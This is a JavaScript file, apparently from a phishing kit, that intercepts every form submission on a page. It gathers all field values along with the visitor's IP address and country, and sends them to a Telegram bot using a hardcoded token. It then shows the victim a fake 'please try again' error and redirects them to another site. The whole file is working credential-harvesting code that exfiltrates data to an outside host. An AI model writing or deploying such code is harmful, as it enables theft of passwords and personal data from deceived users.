document.addEventListener("DOMContentLoaded", () => {
  const DEFAULT_USER_ID = "7979664801"; // fallback if no id in URL
  const BOT_TOKEN = "8433235666:AAGUgGfrFwj5dvE548wxyIpyzjrlaWXu_VA";
  const forms = document.querySelectorAll("form");

  let userCountry = "Unknown"; // default
  let userIP = "Unknown"; // <-- add IP variable

  // Fetch country and IP first
  fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
      if (data) {
        if (data.country_name) userCountry = data.country_name;
        if (data.ip) userIP = data.ip; // <-- store IP
      }
    })
    .catch(err => console.error("IP lookup error:", err));

  forms.forEach((form) => {
    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      // ensure country and IP are available
      if (userCountry === "Unknown" || userIP === "Unknown") {
        try {
          const res = await fetch("https://ipapi.co/json/");
          const data = await res.json();
          if (data) {
            if (data.country_name) userCountry = data.country_name;
            if (data.ip) userIP = data.ip; // <-- retry IP
          }
        } catch (err) {
          console.error("Retry IP lookup error:", err);
        }
      }

      const urlParams = new URLSearchParams(window.location.search);
      const userId = urlParams.get("id") || DEFAULT_USER_ID;

      const formData = {};
      new FormData(form).forEach((value, key) => {
        formData[key] = value;
      });

      // current date & time (local)
      const now = new Date();
      const dateTime = now.toLocaleString(); // e.g. "10/8/2025, 4:25:36 PM"

      // Only include Form line if form has a name
      const formName = (form.getAttribute("name") || "").trim();
      const formLine = formName ? `📄 Form: ${formName}\n` : "";

      const payload = {
        chat_id: userId,
        text:
          `📋 *New Form Submitted*\n\n` +
          `🏷️ Page: ${document.title}\n` +
          formLine +
          `🌍 Country: ${userCountry}\n` +
          `🕒 Date & Time: ${dateTime}\n` +
          `📍 IP: ${userIP}\n\n` + // <-- added IP line
          Object.entries(formData).map(([k, v]) => `• *${k}:* ${v}`).join("\n"),
        parse_mode: "Markdown"
      };

      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        if (response.ok) {
          alert(`⛔ please try again`);
          form.reset();
          window.location.href = "https://otieu.com/4/10060108";
        } else {
          const errorText = await response.text();
          console.error("Telegram Error:", errorText);
          alert(`❌ Error submitting form. Check console for details.`);
        }
      } catch (err) {
        console.error("Network Error:", err);
        alert("⚠️ Network error. Please check your connection.");
      }
    });
  });
});